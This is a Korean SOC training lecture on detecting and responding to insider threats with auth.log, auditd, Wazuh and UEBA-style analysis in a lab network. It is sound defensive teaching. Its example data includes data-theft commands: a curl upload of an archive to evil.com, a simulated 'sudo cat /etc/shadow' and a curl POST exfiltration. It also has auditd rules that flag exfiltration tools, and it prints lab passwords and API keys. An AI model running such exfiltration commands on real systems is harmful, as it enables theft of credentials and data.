@@ -1,0 +1,624 @@
+# Week 12: 인시던트 대응 실습 (3) - 내부 위협
+
+## 학습 목표
+- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
+- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
+- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
+- 내부 위협 인시던트 대응 보고서를 작성한다
+
+## 실습 환경 (6v6 4-tier, 공통)
+
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 다음 표 의 컨테이너 에 `ssh
+6v6-<name>` 으로 접속.
+
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | pen-test 도구 | `ssh 6v6-attacker` |
+
+**Bastion API:** `http://192.168.0.103:8003` / Key: `ccc-api-key-2026`
+**CCC API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
+| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-2:00 | 실습 (Part 3) | 실습 |
+| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
+| 2:40-2:50 | 휴식 | - |
+| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
+| 3:20-3:40 | 정리 + 과제 안내 | 정리 |
+
+---
+
+---
+
+## 용어 해설 (보안관제/SOC 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **SOC** | Security Operations Center | 보안 관제 센터 (24/7 모니터링) | 경찰 112 상황실 |
+| **관제** | Monitoring/Surveillance | 보안 이벤트를 실시간 감시하는 활동 | CCTV 관제 |
+| **경보** | Alert | 보안 이벤트가 탐지 규칙에 매칭되어 발생한 알림 | 화재 경보기 울림 |
+| **이벤트** | Event | 시스템에서 발생한 모든 활동 기록 | 일어난 일 하나하나 |
+| **인시던트** | Incident | 보안 정책을 위반한 이벤트 (실제 위협) | 실제 화재 발생 |
+| **오탐** | False Positive | 정상 활동을 공격으로 잘못 탐지 | 화재 경보기가 요리 연기에 울림 |
+| **미탐** | False Negative | 실제 공격을 놓침 | 도둑이 CCTV에 안 잡힘 |
+| **TTD** | Time to Detect | 공격 발생~탐지까지 걸리는 시간 | 화재 발생~경보 울림 시간 |
+| **TTR** | Time to Respond | 탐지~대응까지 걸리는 시간 | 경보~소방차 도착 시간 |
+| **SIGMA** | SIGMA | SIEM 벤더에 무관한 범용 탐지 룰 포맷 | 국제 표준 수배서 양식 |
+| **Tier 1/2/3** | SOC Tiers | 관제 인력 수준 (L1:모니터링, L2:분석, L3:전문가) | 일반의→전문의→교수 |
+| **트리아지** | Triage | 경보를 우선순위별로 분류하는 작업 | 응급실 환자 분류 |
+| **플레이북** | Playbook (IR) | 인시던트 유형별 대응 절차 매뉴얼 | 화재 대응 매뉴얼 |
+| **포렌식** | Forensics | 사이버 범죄 수사를 위한 증거 수집·분석 | 범죄 현장 감식 |
+| **IOC** | Indicator of Compromise | 침해 지표 (악성 IP, 도메인, 해시) | 수배범의 지문, 차량번호 |
+| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술·기법·절차 | 범인의 범행 수법 |
+| **위협 헌팅** | Threat Hunting | 탐지 룰에 걸리지 않는 위협을 능동적으로 찾는 활동 | 잠복 수사 |
+| **syslog** | syslog | 시스템 로그를 원격 전송하는 프로토콜 (UDP 514) | 모든 부서 보고서를 본사로 모으는 시스템 |
+
+---
+
+## 1. 내부 위협 개요
+
+### 1.1 내부 위협 분류
+
+| 유형 | 설명 | 예시 |
+|------|------|------|
+| 악의적 내부자 | 의도적 데이터 유출/파괴 | 퇴직 전 기밀 반출 |
+| 부주의한 내부자 | 실수로 보안 위반 | 민감 파일 공개 공유 |
+| 권한 남용 | 업무 범위 초과 접근 | sudo로 타인 파일 열람 |
+| 계정 탈취 | 외부 공격자가 내부 계정 사용 | 피싱으로 크리덴셜 탈취 |
+
+### 1.2 시나리오
+
+```
+시나리오: IT 관리자(user)가 sudo 권한을 남용하여
+         다른 사용자 파일 열람 및 외부 전송 시도
+
+모니터링: auditd -> Wazuh SIEM -> SOC 분석
+```
+
+---
+
+## 2. 탐지: sudo 남용 모니터링
+
+> **이 실습을 왜 하는가?**
+> "인시던트 대응 실습 (3) - 내부 위협" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
+> 보안관제/SOC 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
+> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
+>
+> **이걸 하면 무엇을 알 수 있는가?**
+> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
+> - 정상과 비정상 결과를 구분하는 눈을 기름
+> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
+>
+> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.
+
+### 2.1 auth.log에서 sudo 사용 이력 분석
+
+> **실습 목적**: 내부 위협(Insider Threat)을 auth.log의 sudo 사용 이력과 비정상 행위에서 탐지한다
+>
+> **배우는 것**: 정상 관리 작업과 비인가 권한 사용을 구분하고, 내부자 위협 지표를 식별하는 방법을 배운다
+>
+> **결과 해석**: 업무 시간 외 sudo 사용, 비인가 명령 실행, 대량 데이터 접근이 발견되면 내부 위협을 의심한다
+>
+> **실전 활용**: 내부 위협은 탐지가 어렵고 피해가 크므로, UEBA(사용자 행위 분석)가 SOC의 주요 과제이다
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== sudo 사용 이력 분석 ==="
+
+# 전체 sudo 명령 이력
+echo "--- 최근 sudo 명령 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | tail -15  # 패턴 검색
+
+echo ""
+echo "--- sudo 사용 통계 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | \
+  grep "COMMAND=" | \
+  sed 's/.*COMMAND=//' | \
+  sort | uniq -c | sort -rn | head -10                 # 정렬
+
+echo ""
+echo "--- sudo 실패 (비인가 시도) ---"
+grep -E "sudo:.*NOT in sudoers|authentication failure" /var/log/auth.log 2>/dev/null | tail -5  # 패턴 검색
+
+echo ""
+echo "--- 사용자별 sudo 빈도 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | \
+  grep -oP "USER=\w+" | sort | uniq -c | sort -rn      # 디렉터리 재귀 검색
+ENDSSH
+```
+
+### 2.2 auditd 규칙으로 민감 행위 감시
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== auditd 규칙 확인 ==="
+
+# 현재 audit 규칙 확인
+echo "1" | sudo -S auditctl -l 2>/dev/null || echo "auditd 미설치 또는 비활성"
+
+echo ""
+echo "--- 권장 audit 규칙 (내부 위협 탐지) ---"
+cat << 'RULES'
+# 민감 파일 접근 감시
+-w /etc/passwd -p wa -k identity_change
+-w /etc/shadow -p wa -k identity_change
+-w /etc/sudoers -p wa -k sudo_change
+
+# sudo 설정 변경 감시
+-w /etc/sudoers.d/ -p wa -k sudo_change
+
+# 대량 파일 복사/이동
+-a always,exit -F arch=b64 -S rename,renameat -k file_move
+-w /usr/bin/scp -p x -k data_exfil
+-w /usr/bin/rsync -p x -k data_exfil
+-w /usr/bin/curl -p x -k data_exfil
+
+# 계정 생성/삭제
+-w /usr/sbin/useradd -p x -k account_change
+-w /usr/sbin/userdel -p x -k account_change
+RULES
+ENDSSH
+```
+
+### 2.3 Wazuh에서 내부 위협 경보
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-siem << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== Wazuh 내부 위협 관련 경보 ==="
+
+cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
+import sys, json
+sudo_alerts = []
+for line in sys.stdin:                                 # 반복문 시작
+    try:
+        a = json.loads(line.strip())
+        desc = a.get('rule',{}).get('description','').lower()
+        full_log = a.get('full_log','').lower()
+        if 'sudo' in desc or 'sudo' in full_log or 'privilege' in desc:
+            sudo_alerts.append(a)
+    except: pass
+
+print(f'sudo/권한 관련 경보: {len(sudo_alerts)}건')
+for a in sudo_alerts[-10:]:                            # 반복문 시작
+    rule = a.get('rule',{})
+    ts = a.get('timestamp','')
+    agent = a.get('agent',{}).get('name','')
+    print(f'  [{rule.get(\"level\",0)}] {ts[:19]} ({agent}) {rule.get(\"description\",\"\")[:60]}')
+" 2>/dev/null || echo "경보 데이터 접근 불가"
+ENDSSH
+```
+
+---
+
+## 3. 분석: 내부 위협 시나리오 재현
+
+### 3.1 시나리오 1 - sudo를 이용한 파일 열람
+
+로그나 설정에서 특정 패턴을 검색합니다.
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== 시나리오 1: sudo 파일 열람 시뮬레이션 ==="
+
+echo "--- Step 1: 다른 사용자 디렉토리 접근 시도 ---"
+ls /root/ 2>&1 | head -3
+echo "(일반 사용자로는 접근 불가)"
+
+echo ""
+echo "--- Step 2: sudo로 접근 (권한 남용) ---"
+echo "1" | sudo -S ls /root/ 2>/dev/null | head -5
+
+echo ""
+echo "--- Step 3: 접근 로그 확인 ---"
+grep "sudo.*COMMAND.*ls.*root" /var/log/auth.log 2>/dev/null | tail -3  # 패턴 검색
+
+echo ""
+echo "=== 탐지 포인트 ==="
+echo "1. auth.log에 sudo COMMAND 기록"
+echo "2. auditd에서 /root 접근 기록"
+echo "3. Wazuh rule 5402 (sudo 명령 실행) 경보"
+ENDSSH
+```
+
+### 3.2 시나리오 2 - 데이터 유출 시도 패턴
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+exfil_indicators = [
+    {
+        "pattern": "대량 파일 압축",
+        "commands": ["tar czf /tmp/backup.tar.gz /etc/", "zip -r /tmp/data.zip /var/log/"],
+        "detection": "auditd: tar/zip 실행 감시, 파일 크기 모니터링",
+    },
+    {
+        "pattern": "외부 전송",
+        "commands": ["scp /tmp/data.zip user@external:/", "curl -F file=@/tmp/data.zip http://evil.com/"],
+        "detection": "auditd: scp/curl 실행 감시, DLP 솔루션",
+    },
+    {
+        "pattern": "DNS 터널링",
+        "commands": ["dnscat2", "iodine"],
+        "detection": "Suricata: 비정상 DNS 쿼리 탐지, DNS 쿼리 길이/빈도",
+    },
+    {
+        "pattern": "USB 복사",
+        "commands": ["mount /dev/sdb1 /mnt", "cp -r /data /mnt/"],
+        "detection": "udev 규칙, auditd: mount 감시",
+    },
+]
+
+print(f"{'패턴':<20} {'탐지 방법'}")
+print("=" * 70)
+for ind in exfil_indicators:                           # 반복문 시작
+    print(f"\n{ind['pattern']}")
+    for cmd in ind['commands']:                        # 반복문 시작
+        print(f"  명령: {cmd}")
+    print(f"  탐지: {ind['detection']}")
+PYEOF
+ENDSSH
+```
+
+### 3.3 UEBA 스타일 행위 이상 탐지
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+user_activities = [
+    {"time": "09:00", "action": "login", "detail": "SSH 로그인"},
+    {"time": "09:05", "action": "command", "detail": "ls, cd (일반 작업)"},
+    {"time": "09:30", "action": "command", "detail": "vim config.yaml"},
+    {"time": "14:00", "action": "sudo", "detail": "sudo cat /etc/shadow"},
+    {"time": "14:01", "action": "sudo", "detail": "sudo ls /root/"},
+    {"time": "14:02", "action": "command", "detail": "tar czf /tmp/data.tar.gz /root/"},
+    {"time": "14:03", "action": "command", "detail": "curl -X POST http://ext.example.com -F f=@/tmp/data.tar.gz"},
+    {"time": "14:05", "action": "command", "detail": "rm /tmp/data.tar.gz"},
+    {"time": "17:00", "action": "logout", "detail": "정상 퇴근"},
+]
+
+print("시간   행위        상세                                           판정")
+print("=" * 85)
+for act in user_activities:                            # 반복문 시작
+    anomaly = False
+    reason = ""
+    if "shadow" in act["detail"]: anomaly, reason = True, "민감 파일 접근"
+    elif "/root/" in act["detail"] and "sudo" in act["action"]: anomaly, reason = True, "타 사용자 디렉토리"
+    elif "tar" in act["detail"] and "/root" in act["detail"]: anomaly, reason = True, "대량 데이터 수집"
+    elif "curl" in act["detail"] and "ext" in act["detail"]: anomaly, reason = True, "외부 전송 시도"
+    elif act["detail"].startswith("rm") and "tmp" in act["detail"]: anomaly, reason = True, "증거 인멸 의심"
+
+    flag = f"[ANOMALY] {reason}" if anomaly else "[NORMAL]"
+    print(f"{act['time']}  {act['action']:<10}  {act['detail']:<45} {flag}")
+PYEOF
+ENDSSH
+```
+
+---
+
+## 4. 대응 (Response)
+
+### 4.1 계정 비활성화 절차
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-fw << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== 계정 비활성화 절차 (교육용) ==="
+
+cat << 'PROCEDURE'
+내부 위협 확인 시 즉시 대응 절차:
+
+1. 계정 비활성화
+   $ sudo usermod -L [username]
+   $ sudo chage -E 0 [username]
+
+2. 활성 세션 강제 종료
+   $ sudo pkill -u [username]
+
+3. SSH 키 비활성화
+   $ sudo mv /home/[user]/.ssh/authorized_keys /home/[user]/.ssh/authorized_keys.disabled
+
+4. sudo 권한 제거
+   $ sudo deluser [username] sudo
+
+5. 증거 보전
+   $ sudo cp -rp /home/[username]/ /evidence/$(date +%Y%m%d)/
+   $ sudo cp /var/log/auth.log /evidence/$(date +%Y%m%d)/
+   $ sudo journalctl _UID=[uid] > /evidence/$(date +%Y%m%d)/journal.log
+PROCEDURE
+
+echo ""
+echo "--- 현재 활성 사용자 ---"
+who 2>/dev/null                                        # 로그인 사용자 조회
+echo ""
+echo "--- sudo 그룹 ---"
+getent group sudo 2>/dev/null
+ENDSSH
+```
+
+### 4.2 Wazuh Active Response 설정
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-siem << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== Wazuh Active Response 설정 예시 ==="
+
+cat << 'CONFIG'
+<!-- ossec.conf Active Response -->
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>5402,5403</rules_id>
+  <timeout>3600</timeout>
+</active-response>
+
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>5710,5712</rules_id>
+  <timeout>1800</timeout>
+</active-response>
+CONFIG
+
+echo ""
+echo "--- Active Response 바이너리 ---"
+ls -la /var/ossec/active-response/bin/ 2>/dev/null | head -10
+ENDSSH
+```
+
+---
+
+## 5. 보고서 작성
+
+### 5.1 LLM 보고서 자동 생성
+
+```bash
+curl -s http://localhost:8003/v1/chat/completions \
+  -H "Content-Type: application/json" \
+  -d '{                                                # 요청 데이터(body)
+    "model": "gemma3:12b",
+    "messages": [
+      {"role": "system", "content": "SOC 인시던트 대응 보고서 작성 전문가입니다. 한국어로 전문적인 보고서를 작성합니다."},
+      {"role": "user", "content": "다음 내부 위협 인시던트 보고서를 작성하세요:\n\n사건: IT 관리자가 sudo로 /etc/shadow, /root/ 접근 후 tar로 수집, curl로 외부 전송 시도, 증거 삭제\n탐지: auth.log sudo 이력 -> Wazuh 경보 -> SOC\n대응: 계정 잠금, sudo 제거, 세션 종료\n\n1) 타임라인 2) ATT&CK 매핑 3) 재발 방지 권고"}
+    ],
+    "temperature": 0.3
+  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
+```
+
+---
+
+## 6. 내부 위협 방지 체계
+
+### 6.1 예방적 통제
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+controls = {
+    "기술적 통제": [
+        ("최소 권한 원칙", "필요 최소한의 sudo 명령만 허용"),
+        ("DLP", "민감 데이터 외부 전송 차단"),
+        ("UEBA", "사용자 행위 이상 탐지"),
+        ("네트워크 세분화", "내부 네트워크 접근 제한"),
+        ("MFA", "중요 시스템 다중 인증"),
+    ],
+    "관리적 통제": [
+        ("접근 리뷰", "분기별 권한 점검"),
+        ("퇴직자 절차", "즉시 계정 비활성화"),
+        ("보안 교육", "내부 위협 인식 교육"),
+        ("감사 로그", "모든 관리자 행위 기록"),
+    ],
+    "탐지적 통제": [
+        ("로그 모니터링", "sudo, SSH, 파일 접근 실시간 감시"),
+        ("경보 규칙", "비정상 시간대/패턴 경보"),
+        ("정기 감사", "월별 관리자 행위 감사"),
+    ],
+}
+
+for category, items in controls.items():               # 반복문 시작
+    print(f"\n{category}")
+    print("=" * 50)
+    for name, desc in items:                           # 반복문 시작
+        print(f"  - {name}: {desc}")
+PYEOF
+ENDSSH
+```
+
+---
+
+## 핵심 정리
+
+1. 내부 위협은 악의적 내부자, 부주의, 권한 남용, 계정 탈취로 분류된다
+2. auth.log와 auditd는 내부 행위 모니터링의 핵심 데이터 소스다
+3. UEBA 관점에서 사용자 행위 패턴 이상을 탐지해야 한다
+4. 내부 위협 확인 시 계정 잠금, 세션 종료, 증거 보전 순서로 대응한다
+5. 최소 권한 원칙과 정기 접근 리뷰가 예방의 핵심이다
+6. 기술적 + 관리적 + 탐지적 통제를 조합해야 효과적이다
+
+---
+
+## 다음 주 예고
+- Week 13: 위협 인텔리전스(CTI) 활용 - OpenCTI 연동, IOC 조회, 위협 헌팅
+
+---
+
+---
+
+## 웹 UI 실습: Wazuh Active Response + OpenCTI 자동화
+
+> **목적**: Wazuh Dashboard에서 Active Response 설정을 확인하고,
+> OpenCTI에서 인시던트 대응 결과를 기록하는 방법을 익힌다.
+
+### Wazuh Dashboard 접속
+
+1. 브라우저에서 `https://10.20.30.100` 접속
+2. 자체 서명 인증서 경고 → "고급" → "계속 진행"
+3. admin / 비밀번호 입력
+
+### 실습 1: Active Response 관련 이벤트 확인
+
+1. **Wazuh** > **Events** 이동
+2. 검색: `rule.groups: active_response` 또는 `rule.description: *active*response*`
+3. Active Response에 의해 자동 차단된 이벤트 확인
+4. 차단된 IP, 차단 시간, 트리거 규칙 확인
+5. CLI에서 `grep 'active-response' alerts.json` 결과와 비교
+
+### 실습 2: 내부 위협 경보 Dashboard 분석
+
+1. 검색: `rule.description: *sudo*` 또는 `rule.groups: authentication_success`
+2. sudo 사용 이벤트를 시간순으로 정렬
+3. 비정상 시간대(새벽, 주말)의 sudo 사용 이벤트 필터링
+4. 내부 위협 지표:
+   - 업무 외 시간 sudo 사용
+   - 평소와 다른 명령 패턴
+   - 대량 파일 접근
+
+### OpenCTI 접속
+
+1. 브라우저에서 `http://10.20.30.100:8080` 접속
+2. **Email**: `admin@opencti.io` / **Password**: `CCC2026!`
+
+### 실습 3: 인시던트 기록
+
+1. **Events** > **Incidents** 클릭
+2. **+** 버튼으로 새 Incident 생성:
+   - **Name**: `Internal Threat - Sudo Abuse (Practice)`
+   - **Incident type**: `Unauthorized access`
+   - **Severity**: `High`
+   - **Description**: `내부 관리자 sudo 권한 남용 - 타 사용자 파일 접근 및 외부 전송 시도`
+3. 인시던트에 관련 IoC, Threat Actor 연결
+4. 타임라인에 대응 조치 기록: 계정 잠금, sudo 권한 제거, 증거 보전
+
+> **핵심**: Wazuh의 Active Response는 자동 차단을, OpenCTI의 Incident 관리는 대응 과정 기록을 담당한다.
+> 두 도구를 연동하면 탐지-대응-기록의 전 과정이 체계화된다.
+
+---
+
+> **실습 환경 검증 완료** (2026-03-28): Wazuh alerts.json/logtest/agent_control, SIGMA 룰, 경보 분석
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### Wazuh SIEM (4.11.x)
+> **역할:** 에이전트 기반 로그·FIM·SCA 통합 분석 플랫폼  
+> **실행 위치:** `siem (10.20.30.100)`  
+> **접속/호출:** Dashboard `https://10.20.30.100` (admin/admin), Manager API `:55000`
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `/var/ossec/etc/ossec.conf` | Manager 메인 설정 (원격, 전송, syscheck 등) |
+| `/var/ossec/etc/rules/local_rules.xml` | 커스텀 룰 (id ≥ 100000) |
+| `/var/ossec/etc/decoders/local_decoder.xml` | 커스텀 디코더 |
+| `/var/ossec/logs/alerts/alerts.json` | 실시간 JSON 알림 스트림 |
+| `/var/ossec/logs/archives/archives.json` | 전체 이벤트 아카이브 |
+| `/var/ossec/logs/ossec.log` | Manager 데몬 로그 |
+| `/var/ossec/queue/fim/db/fim.db` | FIM 기준선 SQLite DB |
+
+**핵심 설정·키**
+
+- `<rule id='100100' level='10'>` — 커스텀 룰 — level 10↑은 고위험
+- `<syscheck><directories>...` — FIM 감시 경로
+- `<active-response>` — 자동 대응 (firewall-drop, restart)
+
+**로그·확인 명령**
+
+- `jq 'select(.rule.level>=10)' alerts.json` — 고위험 알림만
+- `grep ERROR ossec.log` — Manager 오류 (룰 문법 오류 등)
+
+**UI / CLI 요점**
+
+- Dashboard → Security events — KQL 필터 `rule.level >= 10`
+- Dashboard → Integrity monitoring — 변경된 파일 해시 비교
+- `/var/ossec/bin/wazuh-logtest` — 룰 매칭 단계별 확인 (Phase 1→3)
+- `/var/ossec/bin/wazuh-analysisd -t` — 룰·설정 문법 검증
+
+> **해석 팁.** Phase 3에서 원하는 `rule.id`가 떠야 커스텀 룰 정상. `local_rules.xml` 수정 후 `systemctl restart wazuh-manager`, 문법 오류가 있으면 **분석 데몬 전체가 기동 실패**하므로 `-t`로 먼저 검증.
+
+---
+
+## 실제 사례 (WitFoo Precinct 6 — UEBA top user 분포)
+
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> 본 lecture *내부 위협 IR* 학습 항목 매칭. UEBA baseline + insider 단서.
+
+### top user 분포 (Pareto)
+
+| User | logon | 비율 | UEBA 분류 |
+|------|------|------|---------|
+| USER-0022 | 6,190 | 17.5% | service account 의심 |
+| USER-0012 | 4,577 | 12.9% | high-volume |
+| USER-0765 | 1,560 | 4.4% | normal heavy |
+
+→ **17.5% 가 top 1**. service account 후보 분리 후 UEBA 분석.
+
+### Insider 의심 단서 (4798/4799 enum + 4670 변경)
+
+- 4798/4799 group enum: 7,686 = 0.37% baseline
+- 4670 permission 변경: 188 = 0.009%
+- 두 spike 동시 = *insider 의심*
+
+**학생 액션**: top user 분리 후 *시간/path/role* 3-axis UEBA → 정상 baseline 외 행위 detect.
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course5 SOC — Week 12 자동화 대응)
+
+| 작업 | 도구 |
+|------|------|
+| Active Response | Wazuh AR / fail2ban / Cortex responder |
+| SOAR | Shuffle / TheHive + Cortex / n8n / StackStorm |
+| Webhook | Wazuh integration / curl / Slack incoming webhook |
+| 스크립트 자동화 | bash / python / ansible-playbook |
+| 임의 액션 | Falco actions / Tracee actions |
+
+### 학생 환경 준비
+```bash
+# Shuffle (Modern SOAR, OSS)
+docker run -p 3001:3001 ghcr.io/shuffle/shuffle-frontend:latest
+
+# n8n (workflow automation, OSS)
+docker run -p 5678:5678 docker.n8n.io/n8nio/n8n
+```
+
+### 핵심
+```bash
+# Wazuh integration → Shuffle webhook
+# /var/ossec/etc/ossec.conf
+# <integration><name>shuffle</name><hook_url>http://shuffle:3001/...</hook_url>...</integration>
+
+# Shuffle workflow 예: Wazuh alert → AbuseIPDB lookup → Slack notify → nft block
+
+# 직접 Active Response 스크립트
+sudo tee /var/ossec/active-response/bin/custom-block.sh > /dev/null << 'EOF'
+#!/bin/bash
+ip=$3
+ssh 6v6-fw "sudo nft add element inet filter blocked '{ $ip }'"
+EOF
+sudo chmod +x /var/ossec/active-response/bin/custom-block.sh
+```
